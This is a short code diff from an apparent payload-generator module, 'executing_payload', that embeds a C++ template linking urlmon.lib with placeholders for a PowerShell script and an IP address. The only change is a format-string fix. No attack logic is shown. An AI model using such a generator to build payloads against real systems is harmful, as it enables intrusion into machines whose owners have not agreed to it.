@@ -58,8 +58,8 @@ class executing_payload(Module):
 		#pragma comment(lib, "urlmon.lib")
 		#include <lmcons.h>
 		#include <cstring>
-		#define PSSCRIPT "%%s"
-		#define IPADDR "%%s"
+		#define PSSCRIPT "%s"
+		#define IPADDR "%s"
 		using namespace std;
 
 		int main(void){
